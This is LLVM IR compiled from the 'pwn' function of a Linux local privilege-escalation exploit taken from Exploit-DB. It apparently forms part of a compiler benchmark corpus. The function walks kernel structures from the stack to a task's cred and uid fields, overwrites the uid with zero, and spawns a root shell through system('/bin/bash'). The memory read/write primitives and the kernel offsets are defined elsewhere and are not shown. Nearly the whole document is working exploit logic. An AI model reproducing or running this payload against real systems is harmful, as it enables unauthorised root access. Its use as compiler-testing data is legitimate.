; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_44298.c_pwn.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_44298.c_pwn.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@PHYS_OFFSET = common dso_local global i64 0, align 8
@.str = private unnamed_addr constant [9 x i8] c"bogus fp\00", align 1
@.str.1 = private unnamed_addr constant [9 x i8] c"bogus sp\00", align 1
@.str.2 = private unnamed_addr constant [15 x i8] c"bogus task ptr\00", align 1
@.str.3 = private unnamed_addr constant [19 x i8] c"task_struct = %lx\0A\00", align 1
@CRED_OFFSET = common dso_local global i64 0, align 8
@.str.4 = private unnamed_addr constant [15 x i8] c"bogus cred ptr\00", align 1
@UID_OFFSET = common dso_local global i64 0, align 8
@.str.5 = private unnamed_addr constant [14 x i8] c"bogus uid ptr\00", align 1
@.str.6 = private unnamed_addr constant [14 x i8] c"uidptr = %lx\0A\00", align 1
@.str.7 = private unnamed_addr constant [21 x i8] c"spawning root shell\0A\00", align 1
@.str.8 = private unnamed_addr constant [10 x i8] c"/bin/bash\00", align 1
@.str.9 = private unnamed_addr constant [16 x i8] c"not vulnerable?\00", align 1
@llvm.used = appending global [1 x i8*] [i8* bitcast (void ()* @pwn to i8*)], section "llvm.metadata"

; Function Attrs: noinline nounwind optnone uwtable
define internal void @pwn() #0 {
  %1 = alloca i64, align 8
  %2 = alloca i64, align 8
  %3 = alloca i64, align 8
  %4 = alloca i64, align 8
  %5 = alloca i64, align 8
  %6 = call i64 (...) @__get_fp()
  store i64 %6, i64* %1, align 8
  %7 = load i64, i64* %1, align 8
  %8 = load i64, i64* @PHYS_OFFSET, align 8
  %9 = icmp slt i64 %7, %8
  br i1 %9, label %10, label %12

10:                                               ; preds = %0
  %11 = call i32 @__exit(i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str, i64 0, i64 0))
  br label %12

12:                                               ; preds = %10, %0
  %13 = load i64, i64* %1, align 8
  %14 = call i64 @get_sp(i64 %13)
  store i64 %14, i64* %2, align 8
  %15 = load i64, i64* %2, align 8
  %16 = load i64, i64* @PHYS_OFFSET, align 8
  %17 = icmp slt i64 %15, %16
  br i1 %17, label %18, label %20

18:                                               ; preds = %12
  %19 = call i32 @__exit(i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.1, i64 0, i64 0))
  br label %20

20:                                               ; preds = %18, %12
  %21 = load i64, i64* %2, align 8
  %22 = call i64 @__read(i64 %21)
  store i64 %22, i64* %3, align 8
  %23 = load i64, i64* %3, align 8
  %24 = load i64, i64* @PHYS_OFFSET, align 8
  %25 = icmp slt i64 %23, %24
  br i1 %25, label %26, label %28

26:                                               ; preds = %20
  %27 = call i32 @__exit(i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.2, i64 0, i64 0))
  br label %28

28:                                               ; preds = %26, %20
  %29 = load i64, i64* %3, align 8
  %30 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.3, i64 0, i64 0), i64 %29)
  %31 = load i64, i64* %3, align 8
  %32 = load i64, i64* @CRED_OFFSET, align 8
  %33 = add nsw i64 %31, %32
  %34 = call i64 @__read(i64 %33)
  store i64 %34, i64* %4, align 8
  %35 = load i64, i64* %4, align 8
  %36 = load i64, i64* @PHYS_OFFSET, align 8
  %37 = icmp slt i64 %35, %36
  br i1 %37, label %38, label %40

38:                                               ; preds = %28
  %39 = call i32 @__exit(i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.4, i64 0, i64 0))
  br label %40

40:                                               ; preds = %38, %28
  %41 = load i64, i64* %4, align 8
  %42 = load i64, i64* @UID_OFFSET, align 8
  %43 = add nsw i64 %41, %42
  store i64 %43, i64* %5, align 8
  %44 = load i64, i64* %5, align 8
  %45 = load i64, i64* @PHYS_OFFSET, align 8
  %46 = icmp slt i64 %44, %45
  br i1 %46, label %47, label %49

47:                                               ; preds = %40
  %48 = call i32 @__exit(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.5, i64 0, i64 0))
  br label %49

49:                                               ; preds = %47, %40
  %50 = load i64, i64* %5, align 8
  %51 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.6, i64 0, i64 0), i64 %50)
  %52 = load i64, i64* %5, align 8
  %53 = call i32 @__write(i64 %52, i32 0)
  %54 = call i64 (...) @getuid()
  %55 = icmp eq i64 %54, 0
  br i1 %55, label %56, label %60

56:                                               ; preds = %49
  %57 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.7, i64 0, i64 0))
  %58 = call i32 @system(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.8, i64 0, i64 0))
  %59 = call i32 @exit(i32 0) #3
  unreachable

60:                                               ; preds = %49
  %61 = call i32 @__exit(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.9, i64 0, i64 0))
  ret void
}

declare dso_local i64 @__get_fp(...) #1

declare dso_local i32 @__exit(i8*) #1

declare dso_local i64 @get_sp(i64) #1

declare dso_local i64 @__read(i64) #1

declare dso_local i32 @printf(i8*, ...) #1

declare dso_local i32 @__write(i64, i32) #1

declare dso_local i64 @getuid(...) #1

declare dso_local i32 @system(i8*) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
